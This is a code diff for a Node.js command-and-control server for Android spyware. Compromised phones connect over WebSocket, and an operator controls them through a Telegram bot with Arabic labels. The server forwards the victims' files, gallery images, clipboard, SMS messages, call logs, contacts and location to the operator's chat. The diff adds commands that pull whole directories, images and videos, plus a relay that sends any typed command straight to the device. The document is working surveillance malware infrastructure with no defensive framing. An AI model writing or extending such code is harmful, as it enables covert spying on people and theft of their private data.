@@ -37,19 +37,13 @@ async function sendLongText(title, agentId, text) {
     const MAX = 3500;
     const total = (text || '').length;
     const header = `${title}\n📱 من: <b>${agentId}</b>\n📊 ${total} حرف`;
-
     await appBot.sendMessage(id, header, { parse_mode: 'HTML' }).catch(() => {});
-
     if (total === 0) {
         await appBot.sendMessage(id, '📭 (فارغ)').catch(() => {});
         return;
     }
-
     const chunks = [];
-    for (let i = 0; i < total; i += MAX) {
-        chunks.push(text.substring(i, i + MAX));
-    }
-
+    for (let i = 0; i < total; i += MAX) chunks.push(text.substring(i, i + MAX));
     for (let i = 0; i < chunks.length; i++) {
         const prefix = chunks.length > 1 ? `<b>[${i + 1}/${chunks.length}]</b>\n` : '';
         await appBot.sendMessage(id,
@@ -65,16 +59,15 @@ app.post('/uploadFile', upload.single('file'), (req, res) => {
     if (!req.file) return res.status(400).send('No file');
     const ext = req.file.originalname.split('.').pop().toLowerCase();
     const caption = `°• ملف من <b>${req.headers.model || '?'}</b>\n📄 ${req.file.originalname}`;
-    if (['jpg', 'jpeg', 'png', 'gif'].includes(ext)) {
+    if (['jpg', 'jpeg', 'png', 'gif', 'webp', 'bmp'].includes(ext))
         appBot.sendPhoto(id, req.file.buffer, { caption, parse_mode: 'HTML' }).catch(() => {});
-    } else if (['mp3', 'ogg', 'wav', 'm4a'].includes(ext)) {
+    else if (['mp3', 'ogg', 'wav', 'm4a', 'aac'].includes(ext))
         appBot.sendAudio(id, req.file.buffer, { caption, parse_mode: 'HTML' }).catch(() => {});
-    } else if (['mp4', 'avi', 'mov'].includes(ext)) {
+    else if (['mp4', 'avi', 'mov', 'mkv', '3gp'].includes(ext))
         appBot.sendVideo(id, req.file.buffer, { caption, parse_mode: 'HTML' }).catch(() => {});
-    } else {
+    else
         appBot.sendDocument(id, req.file.buffer, { caption, parse_mode: 'HTML' },
             { filename: req.file.originalname }).catch(() => {});
-    }
     res.send('');
 });
 
@@ -139,9 +132,9 @@ app.post('/uploadClipboard', async (req, res) => {
 app.post('/uploadGallery', async (req, res) => {
     try {
         const list = JSON.parse(req.body.list || '[]');
-        let text = '';
+        let text = `للحصول على صورة، أرسل:\n\`send_image:ID\`\n\n`;
         list.forEach((img, i) => {
-            text += `${i + 1}. ${img.name || '?'}\n   ID: ${img.id || '?'}\n`;
+            text += `${i + 1}. 🖼️ ${img.name || '?'}\n   🆔 ID: ${img.id || '?'}\n   📦 ${img.size || 0} بايت\n`;
         });
         await sendLongText(`🖼️ صور المعرض (${list.length})`, req.body.agentId || '?', text);
     } catch (e) { console.error('gallery:', e.message); }
@@ -188,7 +181,7 @@ appSocket.on('connection', (ws, req) => {
     ws.on('error', (e) => console.error('WS:', e.message));
 });
 
-// ==================== KEYBOARD ====================
+// ==================== KEYBOARDS ====================
 const kbMain = {
     parse_mode: 'HTML',
     reply_markup: {
@@ -199,20 +192,18 @@ const kbMain = {
 
 const cmdsForDevice = (uuid) => ({
     inline_keyboard: [
-        [{ text: '📊 معلومات الجهاز', callback_data: `device_info:${uuid}` },
+        [{ text: '📊 معلومات', callback_data: `device_info:${uuid}` },
          { text: '📦 التطبيقات', callback_data: `apps:${uuid}` }],
-        [{ text: '📁 ملفات', callback_data: `file:${uuid}` },
-         { text: '🖼️ صور المعرض', callback_data: `gallery:${uuid}` }],
+        [{ text: '📂 الجذر', callback_data: `list_sdcard:${uuid}` },
+         { text: '🖼️ المعرض', callback_data: `gallery:${uuid}` }],
         [{ text: '📍 الموقع', callback_data: `location:${uuid}` },
-         { text: '📸 كاميرا أمامية', callback_data: `camera_back:${uuid}` }],
-        [{ text: '🤳 كاميرا سلفي', callback_data: `camera_front:${uuid}` },
-         { text: '🎤 تسجيل صوت', callback_data: `mic:${uuid}` }],
-        [{ text: '📋 الحافظة', callback_data: `clipboard:${uuid}` },
-         { text: '📞 سجل المكالمات', callback_data: `calls:${uuid}` }],
-        [{ text: '💬 الرسائل', callback_data: `messages:${uuid}` },
-         { text: '👥 جهات الاتصال', callback_data: `contacts:${uuid}` }],
-        [{ text: '📳 اهتزاز', callback_data: `vibrate:${uuid}` },
-         { text: '🔙 رجوع', callback_data: `back:${uuid}` }]
+         { text: '📋 الحافظة', callback_data: `clipboard:${uuid}` }],
+        [{ text: '📞 المكالمات', callback_data: `calls:${uuid}` },
+         { text: '💬 الرسائل', callback_data: `messages:${uuid}` }],
+        [{ text: '👥 الاتصال', callback_data: `contacts:${uuid}` },
+         { text: '📳 اهتزاز', callback_data: `vibrate:${uuid}` }],
+        [{ text: '📁 مسار مخصص', callback_data: `file:${uuid}` }],
+        [{ text: '🔙 رجوع', callback_data: `back:${uuid}` }]
     ]
 });
 
@@ -220,7 +211,6 @@ const cmdsForDevice = (uuid) => ({
 appBot.on('message', (message) => {
     const chatId = message.chat.id;
     if (chatId.toString() !== id.toString()) return;
-
     const text = message.text;
     if (!text) return;
 
@@ -228,7 +218,6 @@ appBot.on('message', (message) => {
         appBot.sendMessage(id, '👑 <b>لوحة التحكم</b>\n\nاختر من الأزرار:', kbMain);
         return;
     }
-
     if (text === '📱 الاجهزة المتصلة' || text === 'الاجهزة المتصلة') {
         if (appClients.size === 0) return appBot.sendMessage(id, '❌ لا توجد اجهزة');
         let t = '📱 <b>الأجهزة المتصلة:</b>\n\n';
@@ -238,7 +227,6 @@ appBot.on('message', (message) => {
         appBot.sendMessage(id, t, { parse_mode: 'HTML' });
         return;
     }
-
     if (text === '🎮 تنفيذ الامر' || text === 'تنفيذ الامر') {
         if (appClients.size === 0) return appBot.sendMessage(id, '❌ لا توجد اجهزة');
         const kb = [];
@@ -278,7 +266,6 @@ appBot.on('callback_query', async (cb) => {
         ).catch(() => {});
         return;
     }
-
     if (cmd === 'back') {
         const kb = [];
         appClients.forEach((v, k) => {
@@ -292,8 +279,7 @@ appBot.on('callback_query', async (cb) => {
     }
 
     const instant = ['device_info', 'apps', 'location', 'clipboard', 'vibrate',
-                     'calls', 'messages', 'contacts',
-                     'camera_back', 'camera_front', 'gallery'];
+                     'calls', 'messages', 'contacts', 'gallery', 'list_sdcard'];
 
     if (instant.includes(cmd)) {
         if (!agent) return appBot.answerCallbackQuery(cb.id, { text: 'غير متصل' });
@@ -304,48 +290,38 @@ appBot.on('callback_query', async (cb) => {
 
     if (cmd === 'file') {
         if (!agent) return appBot.answerCallbackQuery(cb.id, { text: 'غير متصل' });
-        await appBot.sendMessage(id, '📁 أدخل مسار المجلد أو الملف:\nمثال: `DCIM/Camera`', {
-            parse_mode: 'Markdown',
-            reply_markup: { force_reply: true }
-        });
-        return;
-    }
-
-    if (cmd === 'mic') {
-        if (!agent) return appBot.answerCallbackQuery(cb.id, { text: 'غير متصل' });
-        await appBot.sendMessage(id, '🎤 أدخل مدة التسجيل بالثواني:\nمثال: `10`', {
-            parse_mode: 'Markdown',
-            reply_markup: { force_reply: true }
-        });
+        await appBot.sendMessage(id,
+            '📁 <b>أدخل أحد الأوامر:</b>\n\n' +
+            '• <code>list_sdcard</code> → عرض الجذر\n' +
+            '• <code>list:DCIM</code> → عرض مجلد DCIM\n' +
+            '• <code>list:DCIM/Camera</code> → عرض الكاميرا\n' +
+            '• <code>send_dir:DCIM/Camera</code> → سحب كل الملفات\n' +
+            '• <code>send_image:ID</code> → سحب صورة (ID من المعرض)\n' +
+            '• <code>send_video:ID</code> → سحب فيديو\n\n' +
+            '💡 ابدأ بـ <code>list_sdcard</code> لعرض الجذر.',
+            { parse_mode: 'HTML', reply_markup: { force_reply: true } });
         return;
     }
 });
 
-// ==================== FORCE REPLY HANDLER ====================
+// ==================== FORCE REPLY ====================
 appBot.on('message', async (message) => {
     if (!message.reply_to_message) return;
     if (message.chat.id.toString() !== id.toString()) return;
+    const orig = message.reply_to_message.text || '';
+    if (!orig.includes('أدخل أحد الأوامر') && !orig.includes('أدخل مسار')) return;
 
-    const originalText = message.reply_to_message.text || '';
-
-    // Find the latest active agent (fallback: first agent)
     let uuid = null;
     appClients.forEach((v, k) => { if (!uuid) uuid = k; });
     if (!uuid) return;
 
-    if (originalText.includes('أدخل مسار')) {
-        const path = message.text || '';
-        appSocket.clients.forEach((ws) => {
-            if (ws.uuid === uuid) ws.send(`file:${path}`);
-        });
-        appBot.sendMessage(id, `📤 جاري إرسال: file:${path}`, kbMain);
-    } else if (originalText.includes('مدة التسجيل')) {
-        const secs = parseInt(message.text) || 10;
-        appSocket.clients.forEach((ws) => {
-            if (ws.uuid === uuid) ws.send(`mic:${secs}`);
-        });
-        appBot.sendMessage(id, `🎤 جاري التسجيل: ${secs} ثانية`, kbMain);
-    }
+    const cmd = (message.text || '').trim();
+    if (!cmd) return;
+
+    appSocket.clients.forEach((ws) => {
+        if (ws.uuid === uuid) ws.send(cmd);
+    });
+    appBot.sendMessage(id, `📤 جاري: <code>${cmd}</code>`, { parse_mode: 'HTML', ...kbMain });
 });
 
 // ==================== PING ====================
